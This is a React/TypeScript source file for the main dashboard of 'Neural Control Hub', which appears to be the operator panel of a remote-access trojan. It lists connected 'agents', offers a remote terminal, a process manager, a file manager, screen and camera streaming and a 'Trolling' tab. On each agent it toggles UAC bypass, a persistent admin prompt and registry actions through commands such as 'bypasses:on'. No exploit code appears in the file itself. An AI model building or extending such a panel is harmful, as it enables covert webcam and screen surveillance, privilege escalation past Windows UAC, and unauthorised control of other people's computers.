import { useState, useEffect, lazy, Suspense } from "react";
 import { useSocket } from "./components/SocketProvider";
import { AgentCard } from "./components/AgentCard";
const StreamViewerLazy = lazy(() =>
  import("./components/StreamViewer").then((mod) => ({ default: mod.StreamViewer }))
);
import { CommandPanel } from "./components/CommandPanel";
import { SystemMonitor } from "./components/SystemMonitor";
import { FileManager } from "./components/FileManager";
import { Header } from "./components/Header";
import { Sidebar } from "./components/Sidebar";
import { SearchAndFilter } from "./components/SearchAndFilter";
import { ActivityFeed } from "./components/ActivityFeed";
 import { QuickActions } from "./components/QuickActions";
import ToggleControlPanel from "./components/ToggleControlPanel";
 const SettingsLazy = lazy(() =>
   import("./components/Settings").then((mod) => ({ default: mod.Settings }))
 );
 const AboutLazy = lazy(() =>
   import("./components/About").then((mod) => ({ default: mod.About }))
 );
 const WebRTCMonitoringLazy = lazy(() =>
   import("./components/WebRTCMonitoring").then((mod) => ({ default: mod.WebRTCMonitoring }))
 );
                                    
 import { BulkUploadManager } from "./components/bulkuploadmanager";
 const ProcessManagerLazy = lazy(() =>
   import("./components/ProcessManager").then((mod) => ({ default: mod.ProcessManager }))
 );
 
import { ThemeProvider } from "./components/ThemeProvider";
import { ErrorBoundary } from "./components/ErrorBoundary";
import { Login } from "./components/Login";
import {
  Tabs,
  TabsContent,
  TabsList,
  TabsTrigger,
} from "./components/ui/tabs";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "./components/ui/card";
import { Badge } from "./components/ui/badge";
import { Button } from "./components/ui/button";
import { Switch } from "./components/ui/switch";
import { Label } from "./components/ui/label";
import {
  Shield,
  Monitor,
  Terminal,
  Files,
  Activity,
  Settings as SettingsIcon,
  Users,
  Wifi,
} from "lucide-react";

interface Agent {
  id: string;
  name: string;
  status: "online" | "offline";
  platform: string;
  ip: string;
  lastSeen: Date;
  capabilities: string[];
  performance: {
    cpu: number;
    memory: number;
    network: number;
  };
}

type FilterOptions = {
  status: string[];
  platform: string[];
  capabilities: string[];
};

// Live agents come from SocketProvider via agent_list_update

function AppContent() {
  const { agents: liveAgents, connected, authenticated, agentConfig, sendCommand, lastActivity } = useSocket() as {
    agents: Agent[];
    connected: boolean;
    authenticated: boolean;
    agentConfig: Record<string, any>;
    sendCommand: (agentId: string, command: string) => void;
    lastActivity: any;
  };
  const [selectedAgent, setSelectedAgent] = useState<
    string | null
  >(null);
  const [activeTab, setActiveTab] = useState("overview");
  const [agents, setAgents] = useState<Agent[]>(liveAgents as Agent[]);
  const [networkActivity, setNetworkActivity] = useState("0.0");

  useEffect(() => {
    setAgents(liveAgents);
  }, [liveAgents]);
  const [searchTerm, setSearchTerm] = useState("");
  const [filters, setFilters] = useState<FilterOptions>({
    status: [],
    platform: [],
    capabilities: [],
  });
  const [sortBy, setSortBy] = useState("name");
  const [sortOrder, setSortOrder] = useState<"asc" | "desc">(
    "asc",
  );

  // Show login screen if not authenticated
  if (!authenticated) {
    return <Login />;
  }

  // Show loading screen while connecting
  if (!connected) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="text-center space-y-4">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary mx-auto"></div>
          <p className="text-muted-foreground">Connecting to Neural Control Hub...</p>
        </div>
      </div>
    );
  }

  const onlineAgents = agents.filter(
    (agent: Agent) => agent.status === "online",
  );

  // Advanced filtering and sorting
  const filteredAgents = agents
    .filter((agent: Agent) => {
      // Text search
      const matchesSearch =
        searchTerm === "" ||
        agent.name
          .toLowerCase()
          .includes(searchTerm.toLowerCase()) ||
        agent.platform
          .toLowerCase()
          .includes(searchTerm.toLowerCase()) ||
        agent.ip.includes(searchTerm);

      // Status filter
      const matchesStatus =
        filters.status.length === 0 ||
        filters.status.includes(agent.status);

      // Platform filter
      const matchesPlatform =
        filters.platform.length === 0 ||
        filters.platform.some((platform) =>
          agent.platform.includes(platform),
        );

      // Capabilities filter
      const matchesCapabilities =
        filters.capabilities.length === 0 ||
        filters.capabilities.every((capability) =>
          agent.capabilities.includes(capability),
        );

      return (
        matchesSearch &&
        matchesStatus &&
        matchesPlatform &&
        matchesCapabilities
      );
    })
    .sort((a: Agent, b: Agent) => {
      let aValue, bValue;

      switch (sortBy) {
        case "status":
          aValue = a.status;
          bValue = b.status;
          break;
        case "platform":
          aValue = a.platform;
          bValue = b.platform;
          break;
        case "lastSeen":
          aValue = a.lastSeen ? a.lastSeen.getTime() : 0;
          bValue = b.lastSeen ? b.lastSeen.getTime() : 0;
          break;
        case "performance":
          aValue = a.performance.cpu + a.performance.memory;
          bValue = b.performance.cpu + b.performance.memory;
          break;
        default:
          aValue = a.name;
          bValue = b.name;
      }

      if (sortOrder === "asc") {
        return aValue > bValue ? 1 : -1;
      } else {
        return aValue < bValue ? 1 : -1;
      }
    });

  const availableFilters: { platforms: string[]; capabilities: string[] } = {
    platforms: [
      ...new Set(
        agents.map((agent: Agent) => agent.platform.split(" ")[0]),
      ),
    ] as string[],
    capabilities: [
      ...new Set(agents.flatMap((agent: Agent) => agent.capabilities)),
    ] as string[],
  };

  const handleAgentSelect = () => {
    const firstOnlineAgent = onlineAgents[0];
    if (firstOnlineAgent) {
      setSelectedAgent(firstOnlineAgent.id);
    }
  };

  const handleAgentDeselect = () => {
    setSelectedAgent(null);
  };

  return (
    <div className="min-h-screen bg-background">
      <div className="flex h-screen">
        {/* Sidebar - Fixed width on desktop, hidden on mobile */}
        <ErrorBoundary>
          <Sidebar
            activeTab={activeTab}
            onTabChange={setActiveTab}
            agentCount={onlineAgents.length}
          />
        </ErrorBoundary>

        {/* Main content area */}
        <div className="flex-1 flex flex-col min-w-0">
          <ErrorBoundary>
            <Header
              activeTab={activeTab}
              onTabChange={setActiveTab}
              onAgentSelect={handleAgentSelect}
              onAgentDeselect={handleAgentDeselect}
              agentCount={onlineAgents.length}
            />
          </ErrorBoundary>

          <main className="flex-1 overflow-auto">
            <ErrorBoundary>
              <div className="p-4 sm:p-6 space-y-6">

            {/* Overview Stats - only show for overview tab */}
            {activeTab === "overview" &&
              !["settings", "about"].includes(activeTab) && (
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                  <Card>
                    <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                      <CardTitle className="text-sm font-medium">
                        Total Agents
                      </CardTitle>
                      <Users className="h-4 w-4 text-muted-foreground" />
                    </CardHeader>
                    <CardContent>
                      <div className="text-2xl font-bold">
                        {agents.length}
                      </div>
                      <p className="text-xs text-muted-foreground">
                        {onlineAgents.length} online
                      </p>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                      <CardTitle className="text-sm font-medium">
                        Active Streams
                      </CardTitle>
                      <Monitor className="h-4 w-4 text-muted-foreground" />
                    </CardHeader>
                    <CardContent>
                      <div className="text-2xl font-bold">0</div>
                      <p className="text-xs text-muted-foreground">
                        Screen + Audio
                      </p>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                      <CardTitle className="text-sm font-medium">
                        Commands Executed
                      </CardTitle>
                      <Terminal className="h-4 w-4 text-muted-foreground" />
                    </CardHeader>
                    <CardContent>
                      <div className="text-2xl font-bold">0</div>
                      <p className="text-xs text-muted-foreground">
                        +12 from last hour
                      </p>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                      <CardTitle className="text-sm font-medium">
                        Network Activity
                      </CardTitle>
                      <Activity className="h-4 w-4 text-muted-foreground" />
                    </CardHeader>
                    <CardContent>
                      <div className="text-2xl font-bold">
                        {networkActivity} MB/s
                      </div>
                      <p className="text-xs text-muted-foreground">
                        Data transferred
                      </p>
                    </CardContent>
                  </Card>
                </div>
              )}

            {/* Advanced Search and Filter - only for main tabs */}
            {!["settings", "about"].includes(activeTab) && (
              <SearchAndFilter
                searchTerm={searchTerm}
                onSearchChange={setSearchTerm}
                onFiltersChange={(next) => setFilters(next)}
                onSortChange={(sortBy, sortOrder) => {
                  setSortBy(sortBy);
                  setSortOrder(sortOrder);
                }}
                availableFilters={availableFilters}
                resultCount={filteredAgents.length}
              />
            )}

            {/* Only show search and tabs for main content, not settings/about */}
            {!["settings", "about"].includes(activeTab) && (
              <Tabs
                value={activeTab}
                onValueChange={setActiveTab}
                className="space-y-6"
              >
                <TabsList className="grid w-full h-auto grid-cols-4 sm:grid-cols-8">
                  <TabsTrigger value="overview" className="text-xs sm:text-sm">
                    Overview
                  </TabsTrigger>
                  <TabsTrigger value="trolling" className="text-xs sm:text-sm">
                    Trolling
                  </TabsTrigger>
                  <TabsTrigger value="agents" className="text-xs sm:text-sm">
                    Agents
                  </TabsTrigger>
                  <TabsTrigger value="streaming" className="text-xs sm:text-sm">
                    Streaming
                  </TabsTrigger>
                  <TabsTrigger value="commands" className="text-xs sm:text-sm">
                    Commands
                  </TabsTrigger>
                  <TabsTrigger value="files" className="text-xs sm:text-sm">
                    Files
                  </TabsTrigger>
                  <TabsTrigger value="monitoring" className="text-xs sm:text-sm">
                    Monitoring
                  </TabsTrigger>
                  <TabsTrigger value="webrtc" className="text-xs sm:text-sm">
                    WebRTC Pro
                  </TabsTrigger>
                </TabsList>
                <div className="text-xs text-muted-foreground">
                  {lastActivity?.type
                    ? (String(lastActivity.type).startsWith('files')
                        ? `Last: Files ${lastActivity.details || ''}`
                        : String(lastActivity.type).startsWith('stream:')
                          ? `Last: ${String(lastActivity.type).replace('stream:', '').toUpperCase()} stream ${lastActivity.details || ''}`
                          : null)
                    : null}
                </div>

                <TabsContent
                  value="overview"
                  className="space-y-6"
                >
                  <Card>
                    <CardHeader>
                      <CardTitle>System Overview</CardTitle>
                      <CardDescription>
                        Real-time status of all connected agents
                        and system performance
                      </CardDescription>
                    </CardHeader>
                    <CardContent>
                      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                        <div className="lg:col-span-2">
                          <ActivityFeed />
                        </div>
                        <div className="space-y-4">
                          <SystemMonitor />
                          <QuickActions
                            agentCount={onlineAgents.length}
                            selectedAgent={selectedAgent}
                          />
                          <Card>
                            <CardHeader>
                              <CardTitle>Security Overview</CardTitle>
                              <CardDescription>
                                UAC bypass and registry status
                              </CardDescription>
                            </CardHeader>
                            <CardContent>
                              {(() => {
                                const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
                                const cfg = aid ? agentConfig?.[aid] : null;
                                const bEnabled = Boolean(cfg?.bypasses?.enabled);
                                const rEnabled = Boolean(cfg?.registry?.enabled);
                                const uacEnabled = Boolean(cfg?.agent?.enableUACBypass);
                                const pPrompt = Boolean(cfg?.agent?.persistentAdminPrompt);
                                const methods = cfg?.bypasses?.methods || {};
                                const actions = cfg?.registry?.actions || {};
                                const methodCount = Object.values(methods).filter(Boolean).length;
                                const actionCount = Object.values(actions).filter(Boolean).length;
                                return (
                                  <div className="space-y-3">
                                    <div className="flex items-center justify-between">
                                      <span className="text-sm">UAC Bypass</span>
                                      <Badge variant={uacEnabled && bEnabled ? "default" : "secondary"}>
                                        {uacEnabled && bEnabled ? "Enabled" : "Disabled"}
                                      </Badge>
                                    </div>
                                    <div className="flex items-center justify-between">
                                      <span className="text-sm">Persistent Admin Prompt</span>
                                      <Badge variant={pPrompt ? "default" : "secondary"}>
                                        {pPrompt ? "On" : "Off"}
                                      </Badge>
                                    </div>
                                    <div className="flex items-center justify-between">
                                      <span className="text-sm">Registry Controls</span>
                                      <Badge variant={rEnabled ? "default" : "secondary"}>
                                        {rEnabled ? "Enabled" : "Disabled"}
                                      </Badge>
                                    </div>
                                    <div className="flex items-center justify-between">
                                      <span className="text-sm">Enabled UAC Methods</span>
                                      <Badge variant="secondary">{methodCount}</Badge>
                                    </div>
                                    <div className="flex items-center justify-between">
                                      <span className="text-sm">Enabled Registry Actions</span>
                                      <Badge variant="secondary">{actionCount}</Badge>
                                    </div>
                                    {aid && cfg ? (
                                      <div className="text-xs text-muted-foreground">
                                        Agent {aid.slice(0, 8)} • Updated {cfg.updatedAt ? new Date(cfg.updatedAt).toLocaleTimeString() : "—"}
                                      </div>
                                    ) : (
                                      <div className="text-xs text-muted-foreground">Select an agent to view security overview</div>
                                    )}
                                  </div>
                                );
                              })()}
                            </CardContent>
                          </Card>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                </TabsContent>
                
                <TabsContent
                  value="trolling"
                  className="space-y-6"
                >
                  <BulkUploadManager />
                </TabsContent>
                <TabsContent
                  value="agents"
                  className="space-y-6"
                >
                  <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
                    {filteredAgents.map((agent: Agent) => (
                      <AgentCard
                        key={agent.id}
                        agent={agent}
                        isSelected={selectedAgent === agent.id}
                        onSelect={() =>
                          setSelectedAgent(agent.id)
                        }
                      />
                    ))}
                  </div>
                  <Card>
                    <CardHeader>
                      <CardTitle>Security Controls</CardTitle>
                      <CardDescription>Bypasses and registry controls per selected agent</CardDescription>
                    </CardHeader>
                    <CardContent>
                      {(() => {
                        const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
                        const cfg = aid ? agentConfig?.[aid] : null;
                        const bEnabled = Boolean(cfg?.bypasses?.enabled);
                        const rEnabled = Boolean(cfg?.registry?.enabled);
                        const methods = cfg?.bypasses?.methods || {};
                        const actions = cfg?.registry?.actions || {};
                        const methodCount = Object.values(methods).filter(Boolean).length;
                        const actionCount = Object.values(actions).filter(Boolean).length;
                        return (
                          <div className="space-y-4">
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                              <div className="flex items-center justify-between">
                                <Label htmlFor="agents-bypass-enabled">Bypasses Enabled</Label>
                                <Switch
                                  id="agents-bypass-enabled"
                                  checked={bEnabled}
                                  onCheckedChange={(checked) => {
                                    if (!aid) return;
                                    sendCommand(aid, checked ? "bypasses:on" : "bypasses:off");
                                  }}
                                />
                              </div>
                              <div className="flex items-center justify-between">
                                <Label htmlFor="agents-registry-enabled">Registry Enabled</Label>
                                <Switch
                                  id="agents-registry-enabled"
                                  checked={rEnabled}
                                  onCheckedChange={(checked) => {
                                    if (!aid) return;
                                    sendCommand(aid, checked ? "registry:on" : "registry:off");
                                  }}
                                />
                              </div>
                            </div>
                            <div className="flex items-center justify-between">
                              <span className="text-sm">Enabled UAC Methods</span>
                              <Badge variant="secondary">{methodCount}</Badge>
                            </div>
                            <div className="flex items-center justify-between">
                              <span className="text-sm">Enabled Registry Actions</span>
                              <Badge variant="secondary">{actionCount}</Badge>
                            </div>
                            <div className="flex items-center gap-2">
                              <Button
                                disabled={!aid}
                                onClick={() => {
                                  if (!aid) return;
                                  sendCommand(aid, bEnabled ? "bypasses:on" : "bypasses:off");
                                }}
                              >
                                Apply Bypasses To Selected
                              </Button>
                              <Button
                                variant="outline"
                                disabled={!aid}
                                onClick={() => {
                                  if (!aid) return;
                                  sendCommand(aid, rEnabled ? "registry:on" : "registry:off");
                                }}
                              >
                                Apply Registry To Selected
                              </Button>
                            </div>
                          </div>
                        );
                      })()}
                    </CardContent>
                  </Card>
                </TabsContent>

                <TabsContent
                  value="streaming"
                  className="space-y-6"
                >
                  <Card>
                    <CardHeader>
                      <CardTitle>Security Controls</CardTitle>
                      <CardDescription>Apply bypasses and registry for streaming operations</CardDescription>
                    </CardHeader>
                    <CardContent>
                      {(() => {
                        const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
                        const cfg = aid ? agentConfig?.[aid] : null;
                        const bEnabled = Boolean(cfg?.bypasses?.enabled);
                        const rEnabled = Boolean(cfg?.registry?.enabled);
                        return (
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div className="flex items-center justify-between">
                              <Label htmlFor="stream-bypass-enabled">Bypasses Enabled</Label>
                              <Switch
                                id="stream-bypass-enabled"
                                checked={bEnabled}
                                onCheckedChange={(checked) => {
                                  if (!aid) return;
                                  sendCommand(aid, checked ? "bypasses:on" : "bypasses:off");
                                }}
                              />
                            </div>
                            <div className="flex items-center justify-between">
                              <Label htmlFor="stream-registry-enabled">Registry Enabled</Label>
                              <Switch
                                id="stream-registry-enabled"
                                checked={rEnabled}
                                onCheckedChange={(checked) => {
                                  if (!aid) return;
                                  sendCommand(aid, checked ? "registry:on" : "registry:off");
                                }}
                              />
                            </div>
                          </div>
                        );
                      })()}
                    </CardContent>
                  </Card>
                  <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading stream viewer…</div>}>
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                      <StreamViewerLazy
                        agentId={selectedAgent}
                        type="screen"
                        title="Screen Stream"
                      />
                      <StreamViewerLazy
                        agentId={selectedAgent}
                        type="camera"
                        title="Camera Stream"
                      />
                    </div>
                  </Suspense>
                </TabsContent>

                <TabsContent
                  value="commands"
                  className="space-y-6"
                >
                  <Tabs defaultValue="terminal" className="space-y-4">
                    <TabsList className="grid w-full grid-cols-2">
                      <TabsTrigger value="terminal">Terminal</TabsTrigger>
                      <TabsTrigger value="processes">Process Manager</TabsTrigger>
                    </TabsList>
                    <TabsContent value="terminal">
                      <CommandPanel agentId={selectedAgent} />
                    </TabsContent>
                    <TabsContent value="processes">
                      <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading processes…</div>}>
                        <ProcessManagerLazy
                          agentId={selectedAgent}
                          isConnected={onlineAgents.length > 0}
                        />
                      </Suspense>
                    </TabsContent>
                  </Tabs>
                </TabsContent>

                <TabsContent
                  value="files"
                  className="space-y-6"
                >
                  <Card>
                    <CardHeader>
                      <CardTitle>Security Controls</CardTitle>
                      <CardDescription>Apply bypasses and registry that affect file operations</CardDescription>
                    </CardHeader>
                    <CardContent>
                      {(() => {
                        const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
                        const cfg = aid ? agentConfig?.[aid] : null;
                        const bEnabled = Boolean(cfg?.bypasses?.enabled);
                        const rEnabled = Boolean(cfg?.registry?.enabled);
                        return (
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div className="flex items-center justify-between">
                              <Label htmlFor="files-bypass-enabled">Bypasses Enabled</Label>
                              <Switch
                                id="files-bypass-enabled"
                                checked={bEnabled}
                                onCheckedChange={(checked) => {
                                  if (!aid) return;
                                  sendCommand(aid, checked ? "bypasses:on" : "bypasses:off");
                                }}
                              />
                            </div>
                            <div className="flex items-center justify-between">
                              <Label htmlFor="files-registry-enabled">Registry Enabled</Label>
                              <Switch
                                id="files-registry-enabled"
                                checked={rEnabled}
                                onCheckedChange={(checked) => {
                                  if (!aid) return;
                                  sendCommand(aid, checked ? "registry:on" : "registry:off");
                                }}
                              />
                            </div>
                          </div>
                        );
                      })()}
                    </CardContent>
                  </Card>
                  <FileManager agentId={selectedAgent} />
                </TabsContent>

                

                <TabsContent
                  value="monitoring"
                  className="space-y-6"
                >
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    <SystemMonitor />
                    <Card>
                      <CardHeader>
                        <CardTitle>
                          Network Performance
                        </CardTitle>
                      </CardHeader>
                      <CardContent>
                        <div className="space-y-4">
                          <div className="flex justify-between items-center">
                            <span className="text-sm">
                              Latency
                            </span>
                            <Badge variant="secondary">
                              12ms
                            </Badge>
                          </div>
                          <div className="flex justify-between items-center">
                            <span className="text-sm">
                              Throughput
                            </span>
                            <Badge variant="secondary">
                              2.4 MB/s
                            </Badge>
                          </div>
                          <div className="flex justify-between items-center">
                            <span className="text-sm">
                              Packet Loss
                            </span>
                            <Badge variant="secondary">
                              0.1%
                            </Badge>
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  </div>
                  <ToggleControlPanel />
                </TabsContent>

                <TabsContent value="webrtc" className="space-y-6">
                  <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading WebRTC monitoring…</div>}>
                    <WebRTCMonitoringLazy selectedAgent={selectedAgent} />
                  </Suspense>
                </TabsContent>
              </Tabs>
            )}

            {/* Settings Page */}
            {activeTab === "settings" && (
              <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading settings…</div>}>
                <SettingsLazy />
              </Suspense>
            )}

            {/* About Page */}
            {activeTab === "about" && (
              <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading about…</div>}>
                <AboutLazy />
              </Suspense>
            )}
              </div>
            </ErrorBoundary>
          </main>
        </div>
      </div>
    </div>
  );
}

export default function App() {
  return (
    <ThemeProvider
      defaultTheme="system"
      storageKey="neural-control-hub-theme"
    >
      <AppContent />
    </ThemeProvider>
  );
}
